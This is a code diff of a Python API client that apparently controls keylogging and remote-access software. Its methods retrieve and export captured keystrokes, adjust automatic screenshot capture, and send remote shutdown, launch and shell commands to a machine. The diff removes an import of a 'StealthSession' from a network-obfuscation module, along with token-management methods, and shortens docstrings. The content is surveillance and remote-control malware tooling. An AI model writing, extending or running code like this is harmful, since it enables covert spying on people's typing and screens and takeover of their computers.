@@ -1,11 +1,8 @@
 """
-API Client - Handles communication with server
-Wraps all API calls with error handling and authentication
+API Client - Fixed version with proper request handling
 """
-
 import requests
 from typing import Optional, Dict, Any, List
-from server_modules.network_obfuscation import StealthSession
 
 
 class APIClient:
@@ -26,7 +23,13 @@ class APIClient:
         self.server_url = server_url.rstrip('/')
         self.api_key = api_key
         self.timeout = timeout
-        self.session = StealthSession(api_key)
+        
+        # Create standard session
+        self.session = requests.Session()
+        self.session.headers.update({
+            'X-API-Key': api_key,
+            'Content-Type': 'application/json'
+        })
 
     def _make_request(self, method: str, endpoint: str, **kwargs) -> Optional[Dict[Any, Any]]:
         """
@@ -44,7 +47,18 @@ class APIClient:
             url = f"{self.server_url}{endpoint}"
             kwargs.setdefault('timeout', self.timeout)
             
-            response = self.session.request(method, url, **kwargs)
+            # Use session for connection pooling
+            if method.upper() == 'GET':
+                response = self.session.get(url, **kwargs)
+            elif method.upper() == 'POST':
+                response = self.session.post(url, **kwargs)
+            elif method.upper() == 'PUT':
+                response = self.session.put(url, **kwargs)
+            elif method.upper() == 'DELETE':
+                response = self.session.delete(url, **kwargs)
+            else:
+                print(f"Unsupported method: {method}")
+                return None
             
             if response.status_code == 200:
                 return response.json()
@@ -83,16 +97,7 @@ class APIClient:
     def get_events(self, limit: int = 100, event_type: str = None, 
                    search: str = None, start_date: str = None, 
                    end_date: str = None) -> Optional[List[Dict[str, Any]]]:
-        """
-        Get events with optional filtering
-        
-        Args:
-            limit: Maximum number of events
-            event_type: Filter by type (e.g., 'key_press', 'mouse_click')
-            search: Text search in events
-            start_date: Start date filter (ISO format)
-            end_date: End date filter (ISO format)
-        """
+        """Get events with optional filtering"""
         params = {'limit': limit}
         if event_type:
             params['type'] = event_type
@@ -112,13 +117,7 @@ class APIClient:
 
     def get_keystroke_buffer(self, limit: int = 1000, 
                             format_type: str = 'json') -> Optional[Any]:
-        """
-        Get keystroke buffer
-        
-        Args:
-            limit: Maximum keystrokes to return
-            format_type: 'json' or 'text'
-        """
+        """Get keystroke buffer"""
         params = {'limit': limit, 'format': format_type}
         return self._make_request('GET', '/api/keystrokes/buffer', params=params)
 
@@ -141,13 +140,7 @@ class APIClient:
 
     def update_screenshot_settings(self, enabled: bool = None, 
                                    interval: int = None) -> Optional[Dict[str, Any]]:
-        """
-        Update automatic screenshot settings
-        
-        Args:
-            enabled: Enable/disable auto screenshots
-            interval: Interval in seconds
-        """
+        """Update automatic screenshot settings"""
         data = {}
         if enabled is not None:
             data['enabled'] = enabled
@@ -158,16 +151,7 @@ class APIClient:
 
     # Remote Commands
     def execute_command(self, cmd_type: str, **kwargs) -> Optional[Dict[str, Any]]:
-        """
-        Execute remote command
-        
-        Args:
-            cmd_type: Command type ('shutdown', 'restart', 'launch', 'shell')
-            **kwargs: Additional command parameters
-                - path: For 'launch' command
-                - command: For 'shell' command
-                - timeout: For 'shell' command
-        """
+        """Execute remote command"""
         data = {'type': cmd_type, **kwargs}
         return self._make_request('POST', '/api/command', json=data, timeout=kwargs.get('timeout', 30))
 
@@ -255,23 +239,3 @@ class APIClient:
     def export_keystrokes(self) -> Optional[List[Dict[str, Any]]]:
         """Export all keystrokes"""
         return self._make_request('GET', '/api/export', params={'type': 'keystrokes'})
-
-    # Token Management (if implemented)
-    def get_tokens(self) -> Optional[Dict[str, Any]]:
-        """Get stored tokens"""
-        return self._make_request('GET', '/api/token')
-
-    def add_token(self, token_data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
-        """Add token"""
-        return self._make_request('POST', '/api/token', 
-                                 json={'operation': 'add', 'token': token_data})
-
-    def remove_token(self, token_id: str) -> Optional[Dict[str, Any]]:
-        """Remove token"""
-        return self._make_request('POST', '/api/token', 
-                                 json={'operation': 'remove', 'id': token_id})
-
-    def clear_tokens(self) -> Optional[Dict[str, Any]]:
-        """Clear all tokens"""
-        return self._make_request('POST', '/api/token', 
-                                 json={'operation': 'clear'})
